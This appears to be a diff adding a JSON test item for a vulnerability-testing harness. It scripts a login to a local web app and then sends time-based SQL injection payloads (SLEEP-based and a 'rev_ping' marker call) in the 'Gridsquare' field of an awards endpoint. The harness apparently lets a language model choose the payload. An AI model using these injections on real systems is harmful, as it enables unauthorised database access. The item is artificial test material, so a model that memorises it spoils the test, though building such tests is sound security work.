@@ -1,0 +1,67 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3500",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_login",
+          "method": "GET",
+          "url": "/index.php/user/login",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login",
+          "method": "POST",
+          "url": "/index.php/user/login",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "user_name": "<admin_user>",
+            "user_password": "<admin_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_vucc_details_ajax",
+          "method": "POST",
+          "url": "/index.php/awards/vucc_details_ajax",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "Gridsquare": "<gridsquare_payload>",
+            "Band": "All"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "gridsquare_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "gridsquare_payload": [
+        "IO91",
+        "IO91' OR SLEEP(3)-- -",
+        "IO91' OR (SELECT SLEEP(3))-- -",
+        "IO91' OR rev_ping(0x636c6f75646c6f6730)-- -"
+      ]
+    }
+  }
+]
